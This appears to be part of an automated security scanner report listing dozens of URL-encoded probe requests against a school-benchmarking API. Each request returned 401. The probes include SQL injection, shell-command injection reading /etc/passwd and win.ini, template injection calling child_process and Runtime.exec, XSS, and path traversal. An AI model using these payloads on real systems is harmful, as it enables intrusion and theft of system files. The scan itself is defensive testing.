* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2526cat+%252Fetc%252Fpasswd%2526&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2526sleep+15.0%2526&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2526timeout+%252FT+15.0&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2526type+%2525SYSTEMROOT%2525%255Cwin.ini&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%2526cat+%252Fetc%252Fpasswd%2526%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%2526sleep+15.0%2526%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%2526timeout+%252FT+15.0%2526%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%2528&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%2529+UNION+ALL+select+NULL+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%253Bget-help&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%253Bsleep+15.0%253B%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%253Bstart-sleep+-s+15.0&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%257Ctimeout+%252FT+15.0&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527+%252F+sleep%252815%2529+%252F+%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527+AND+%25271%2527%253D%25271%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527+AND+%25271%2527%253D%25272%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527+OR+%25271%2527%253D%25271%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527+UNION+ALL+select+NULL+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2529+UNION+ALL+select+NULL+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%253B&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%253Bcat+%252Fetc%252Fpasswd%253B&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%253Bget-help&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%253Bget-help+%2523&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%253Bsleep+15.0%253B&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%253Bstart-sleep+-s+15.0&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%253Bstart-sleep+-s+15.0+%2523&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%257Ctimeout+%252FT+15.0&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2522%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2522%252Bresponse.write%2528787%252C443*45%252C657%2529%252B%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2522java.lang.Thread.sleep%2522%252815000%2529
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2523%257B%2525x%2528sleep+15%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2527%2528
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%252F%252F1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%252Fetc%252Fpasswd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%252Fuser-data
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%252FWEB-INF%252Fweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%253C%2521--
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
